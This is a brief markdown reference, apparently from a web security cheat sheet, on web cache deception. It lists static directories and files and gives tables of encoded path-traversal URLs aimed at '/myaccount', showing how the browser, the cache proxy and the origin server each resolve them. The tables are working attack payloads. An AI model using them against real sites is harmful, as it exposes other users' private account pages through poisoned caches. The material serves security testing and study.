## Static directories
```
/static
/assets
/wp-content
/media
/templates
/public
/shared
/resources
```

|           Browser             |        Cache Proxy       | Origin Server |
|-------------------------------|--------------------------|---------------|
| `/myaccount$/..%2Fstatic/any` |       `/static/any`      | `/myaccount`  |
|    `/static/..%2Fmyaccount`   | `/static/..%2Fmyaccount` | `/myaccount`  |
|    `/static/..%5Cmyaccount`   | `/static/..%5Cmyaccount` | `/myaccount`  |

## Static files
```
/robots.txt
/favicon.ico
/index.html
```

|           Browser             |        Cache Proxy       | Origin Server |
|-------------------------------|--------------------------|---------------|
| `/myaccount$/..%2Frobots.txt` |       `/robots.txt`      | `/myaccount`  |